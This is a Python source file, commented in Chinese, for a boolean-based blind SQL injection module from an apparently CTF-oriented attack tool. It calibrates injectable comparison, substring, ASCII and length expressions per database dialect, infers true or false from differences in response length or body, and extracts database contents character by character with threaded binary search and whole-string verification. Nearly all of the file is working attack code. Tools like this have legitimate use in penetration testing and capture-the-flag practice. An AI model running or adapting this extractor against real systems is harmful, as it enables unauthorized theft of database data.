# -*- coding: utf-8 -*-
"""布尔盲注（v1.1：差分判定 + 表达式校准 + 字符集二分）

为什么不用「响应长度 > 固定阈值」判真假？
    很多靶子（debug 模式）会把执行的 SQL 一起回显到页面，
    于是 payload 文本本身会撑大响应长度 —— 越长的条件看起来越「真」，
    固定阈值直接失效。

差分判定：
    对同一条件，再发一份「右值换成等长 9 串」的版本。9 串必然使条件为假，
    两次 payload 长度完全一致 → 回显部分长度一致 → 响应长度之差只剩结果集。
    差 > 0 即判真。对回显型靶子、抖动型靶子都稳。

v1.2：内容差分兜底
    若目标把响应长度压平（统一模板 / 强 200 同长框架），上面这套长度差分
    会整体失效 —— 真样本与假样本长度一模一样，差值恒为 0。
    此时自动切到「响应体内容差分」：真样本（条件成立）比假样本多回显内容，
    用 core.detector.body_diff 比较两份响应体的差异度即可判真。
    门槛由基线噪声推出，避免把页面里的时间戳 / token 当成信号。

v1.2：probe 必须验证**真实提取表达式**
    probe 不再只看裸比较（`2>=1` 在任何库上都成立），而是要求
    calibrate() 把「比较 / 取码+截取 / 长度」三件套都验通才采纳。
    否则关键字被过滤、或方言判断错误时，工具会选中一套根本求不了值的写法，
    一路判假却不再降级到后面的策略。
"""
from concurrent.futures import ThreadPoolExecutor

from core.detector import body_diff, body_gate
from techniques.base import BaseTechnique


# 预设字符集
CHARSETS = {
    "full":  "".join(chr(i) for i in range(32, 127)),           # 全 ASCII 可打印
    # 注意：字符集外的字符会被静默「取邻近字符」而不是报错。
    # 例如 flag 里出现 '+' (43) 而字符集只到 '*' (42) → 会读成 '*'。
    # 所以 flag 预设要覆盖常见符号，别漏 + | = ~ : ; , . / ? 等。
    "flag":  "{}_-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "!@#$%^&*()+|=~:;,.<>?/",
    "hex":   "0123456789abcdef",
    "hexu":  "0123456789abcdefABCDEF",
    "alnum": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_",
    "digit": "0123456789",
    "lower": "abcdefghijklmnopqrstuvwxyz_0123456789{}",
    "sql":   "abcdefghijklmnopqrstuvwxyz_0123456789",
}


class BooleanTechnique(BaseTechnique):
    name = "Boolean Blind"

    def __init__(self, *args, charset="full", test_votes=2, **kwargs):
        super().__init__(*args, **kwargs)
        self.charset = CHARSETS.get(charset, charset)
        if not self.charset:
            self.charset = CHARSETS["full"]
        self.charset_sorted = sorted(set(self.charset), key=ord)
        # 每个判定的投票次数。默认 2（稳健）；--fast 时才降到 1。
        # 单票遇到偶发抖动会翻错一位，flag 场景不能接受。
        self.test_votes = max(1, int(test_votes))
        # 「必假样本」响应长度缓存：见 _false_len()
        self._false_len_cache = {}
        # 缓存开关：整串校验失败重抽时会临时关掉，退回「每次实时对拍」
        self._use_false_cache = True
        # v1.2：长度不可分时改用内容差分（probe() 里按闭合探测结果决定）
        self._body_mode = False
        self._body_gate = body_gate(0.0)

    # ---------------- 差分判定 ----------------
    def _resp_of(self, condition):
        """发一次条件请求，返回完整响应（网络失败 / 异常状态返回 None）。

        只有「成功响应」才可用于差分判定。
        靶场偶发 4xx/5xx（后端报错页、限流页、DB 锁等待）时响应长度会突变，
        一旦被当成「假样本」基准缓存下来，该位置的判定就会持续偏假 ——
        外在表现就是一整段字符被读成**更小**的字符（二分一路判假往下收敛）。
        """
        payload = self._t(f"({condition})")
        final = self.det.prefix + payload + self.det.suffix
        r = self.req.send(final, use_cache=False)
        if r["status"] == -1:
            return None
        if not (200 <= r["status"] < 400):
            return None
        return r

    def _len_of(self, condition):
        r = self._resp_of(condition)
        return None if r is None else r["length"]

    def _false_len(self, left, w, fake):
        """取「必假样本」的响应长度。

        关键优化：假样本 `left>=9999` 的响应长度只取决于 **payload 文本长度**
        （回显型靶子会把 payload 原样吐回页面），而同一位置下 payload 长度是固定的
        （右值始终零填充到 w 位）。因此可以缓存一次复用，把每次判定的请求数
        从 2 降到 1。

        仅在目标抖动为 0（页面长度稳定、没有随机元素）时启用；
        否则退回「每次实时对拍」，避免缓存漂移导致误判。
        """
        if not self._use_false_cache:
            return None
        if getattr(self.det, "baseline_jitter", 0) != 0:
            return None
        key = (left, w)
        if key not in self._false_len_cache:
            v = self._len_of(self.gte(left, fake))
            if v is None:
                return None          # 没拿到有效长度 → 不写缓存，下次重新取
            self._false_len_cache[key] = v
        return self._false_len_cache[key]

    def _vote(self, left, rs, fake, w, margin):
        """一次投票：+1 真 / -1 假 / 0 存疑"""
        a = self._len_of(self.gte(left, rs))
        b = self._false_len(left, w, fake)
        if b is None:
            b = self._len_of(self.gte(left, fake))
        if a is None or b is None:
            return 0
        d = a - b
        if d > margin:
            return 1
        if d < -margin:
            return -1
        return 0

    def _test(self, left, right):
        """差分判定：gte(left, right) 是否为真。

        假样本右值用「同宽度的 9 串」，保证 payload 文本长度不变，
        从而抵消「回显/抖动」带来的长度干扰。

        关键细节：右值统一零填充到固定宽度（至少 4 位）再比较。
        否则像 ord('a')=97 这种 2 位数，等长假样本只能是 99，
        而 97/98 的真实值仍可能 >=99 成立 → 判真失准。

        稳健性：先投 test_votes 票；若平票（真假各半）说明遇到噪声，
        再补投最多 2 票，避免「一票噪声 + 一票正确 = 平票 = 判负」而翻错字符。
        """
        try:
            rv = int(right)
        except (TypeError, ValueError):
            rv = 0
        w = max(4, len(str(abs(rv))))
        rs = str(rv).zfill(w)
        fake = "9" * w

        # v1.2：长度不可分时走内容差分 —— 此时长度差恒为 0，投多少票都没用
        n = max(1, getattr(self, "test_votes", 2) or 2)
        if self._body_mode:
            votes = sum(1 if self._test_by_body(left, rs, fake) else -1
                        for _ in range(n))
            extra = 0
            while votes == 0 and extra < 2:
                extra += 1
                votes += 1 if self._test_by_body(left, rs, fake) else -1
            return votes > 0

        margin = max(5, getattr(self.det, "threshold", 5) or 5)

        votes = sum(self._vote(left, rs, fake, w, margin) for _ in range(n))
        extra = 0
        while votes == 0 and extra < 2:
            extra += 1
            votes += self._vote(left, rs, fake, w, margin)
        return votes > 0

    def _test_by_body(self, left, rs, fake):
        """长度不可分时的内容差分判定。

        真样本（left >= 真值）会比假样本多回显内容；假样本（left >= 9999）
        必然空结果。两份响应体的差异度超过门槛即判真。

        门槛来自闭合探测阶段的基线噪声估计（同一 payload 连发 3 次的差异度），
        所以页面里带时间戳 / 随机 token 时门槛会自动抬高。
        """
        a = self._resp_of(self.gte(left, rs))
        b = self._resp_of(self.gte(left, fake))
        if a is None or b is None:
            return False
        return body_diff(a["text"], b["text"]) > self._body_gate

    # ---------------- 校准 ----------------
    def calibrate(self):
        """挑一组当前过滤下仍可用的表达式写法（用差分判定验证）。

        返回 True 表示「比较 / 取码+截取 / 长度」三件套**都**验证通过，可以进入提取；
        返回 False 表示当前这套写法求不了值（关键字被过滤，或方言根本不对）。

        为什么必须把结果返回出去：probe 过去只用裸比较（如 `2>=1`）当验收条件，
        而裸比较不含任何方言特有的函数 —— 于是即使 SUBSTR / ASCII / LENGTH
        全部被过滤或因方言不符而报错，probe 照样「通过」，
        engine 便抱着一套废写法去盲注：一路判假、提取出空串，
        而且从此**不会再降级**到后面的策略（典型表现是卡在「获取当前数据库」）。
        """
        # 1) 比较写法：2>=1 真、2>=9 假（两侧都要验，防「恒真」写法蒙混过关）
        ok_gte = False
        for pat in self.GTE_PATTERNS:
            self.gte_pat = pat
            if self._test("2", "1") and not self._test("2", "9"):
                ok_gte = True
                break
        if not ok_gte:
            self.gte_pat = self.GTE_PATTERNS[0]

        # 2) 取码 + 截取：ASCII(SUBSTR('A',1,1)) = 65 且 != 66
        sub_all = self.dialect.substr_templates()
        asc_all = self.dialect.ascii_templates()
        ok_code = False
        for sub_tpl in sub_all:
            for asc_tpl in asc_all:
                self.sub_tpl, self.ascii_tpl = sub_tpl, asc_tpl
                expr = asc_tpl.format(sql=sub_tpl.format(sql="'A'", pos=1, len=1))
                if self._test(expr, "65") and not self._test(expr, "66"):
                    ok_code = True
                    break
            if ok_code:
                break
        if not ok_code:
            # 全部试完都不成立 → 复位到默认写法。
            # 原来失败时停在「最后试到的那组」上，等于随机挑了一组，纯坑。
            self.sub_tpl, self.ascii_tpl = sub_all[0], asc_all[0]

        # 3) 长度：LENGTH('AB') = 2 且 != 3
        len_all = self.dialect.length_templates()
        ok_len = False
        for len_tpl in len_all:
            self.len_tpl = len_tpl
            expr = len_tpl.format(sql="'AB'")
            if self._test(expr, "2") and not self._test(expr, "3"):
                ok_len = True
                break
        if not ok_len:
            self.len_tpl = len_all[0]

        return ok_gte and ok_code and ok_len

    # ---------------- 探测 ----------------
    def probe(self):
        # v1.2：闭合探测若报告「True/False 长度相同」，说明长度差分整体失效，
        # 直接切到内容差分，否则后面每一次判定都会恒为假。
        self._body_mode = (
            getattr(self.det, "true_len", None) is not None
            and self.det.true_len == self.det.false_len
        )
        self._body_gate = body_gate(getattr(self.det, "baseline_noise", 0.0))
        if self._body_mode:
            print("    [*] 响应长度不可分 → 改用响应体内容差分判定")

        if not self.calibrate():
            # 取码 / 截取 / 长度里至少有一项在当前过滤（或当前方言）下求不了值。
            # 硬上只会「一路判假、提取出空串」，还会挡住后面更能用的策略 ——
            # 所以这里必须返回 False，把选择权交回 engine。
            print("    [-] 当前写法无法求值（关键字被过滤或方言不符），换下一组")
            return False

        print(f"    [+] 表达式: >=[{self.gte_pat}] "
              f"截取[{self.sub_tpl}] 取码[{self.ascii_tpl}] 长度[{self.len_tpl}]")
        return True

    # ---------------- 兼容基类接口 ----------------
    def _cond_true(self, condition):
        """保留给基类/外部调用（本类内部走差分判定）。"""
        r = self.req.send(self.det.build(f"({condition})"))
        if r["status"] == -1:
            return False
        mid = (self.det.true_len + self.det.false_len) / 2
        if self.det.true_len > self.det.false_len:
            return r["length"] > mid
        return r["length"] < mid

    # ---------------- 二分查找 ----------------
    def _binary_search_char(self, sql_expr, pos):
        """在字符集中二分出 ord(字符)。

        注意 mid 必须**向上取整**：找「最大的 ord 不超过目标」时若用向下取整，
        当 lo=22、hi=23 时 mid 恒为 22，lo=mid 不前进 → 死循环
        （原版就埋了这个雷，只有特定字符才触发）。
        """
        chars = self.charset_sorted
        lo, hi = 0, len(chars) - 1
        left = self.ascii(self.sub(sql_expr, pos, 1))
        guard = 0
        while lo < hi and guard < 64:
            guard += 1
            mid = (lo + hi + 1) // 2
            if self._test(left, ord(chars[mid])):
                lo = mid
            else:
                hi = mid - 1
        return chars[lo]

    def _binary_search_length(self, sql_expr, max_len=300):
        low, high = 0, max_len
        guard = 0
        while low < high and guard < 64:
            guard += 1
            mid = (low + high) // 2
            if self._test(self.length(sql_expr), str(mid + 1)):
                low = mid + 1
            else:
                high = mid
        return low

    # ---------------- 提取 ----------------
    def extract_length(self, sql_expr):
        return self._binary_search_length(sql_expr)

    def _verify(self, sql_expr, out):
        """整串等值校验：`((expr)=<DBMS 对应的字面量>) >= 1` ⇔ 字符串完全相等。

        字面量必须按 DBMS 生成 —— MySQL 用 `0x..`，SQLite 得
        `CAST(x'..' AS TEXT)`，否则校验恒为假（见 dialect.hex_to_str）。
        """
        try:
            hexed = out.encode("utf-8", "ignore").hex()
            if not hexed:
                return True
            lit = self.dialect.hex_to_str(hexed)
            return self._test(f"(({sql_expr})={lit})", "1")
        except Exception:
            return True

    def extract(self, sql_expr, _retry=False):
        length = self.extract_length(sql_expr)
        if length <= 0:
            return ""
        result = [""] * length

        def fetch(i):
            return i, self._binary_search_char(sql_expr, i)

        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            for i, c in ex.map(fetch, range(1, length + 1)):
                result[i - 1] = c
        out = "".join(result)

        # ---- 整体校验 ----
        # 字符集缺字符时，二分会静默取到「不超过目标的最近字符」（如 '+'→'*'），
        # 只靠长度发现不了。这里用一次差分判定做整串比对：
        #   MySQL 里 ((expr)=0x..) 求值为 1/0，于是「>=1」等价于「字符串完全相等」。
        #   走差分（而非 det.is_true）是为了在回显型靶子上也稳。
        if out and not self._verify(sql_expr, out):
            if not _retry:
                # 校验不过 = 结果不可信。最常见的成因不是字符集，而是
                # 偶发响应异常污染了差分基准（见 _len_of 的注释）。
                # 处理：清空缓存 + 关掉缓存，实时对拍重抽一次。
                print("    [!] 整串校验未通过，疑似偶发响应异常污染了差分基准")
                print("        清空缓存、禁用缓存后重抽一次（会慢一些）...")
                self._false_len_cache.clear()
                self._use_false_cache = False
                try:
                    return self.extract(sql_expr, _retry=True)
                finally:
                    self._use_false_cache = True
            print("    [!] 校验仍不一致：结果可能被字符集截断，"
                  "请换更大的 --charset（如 --charset full）")
        return out
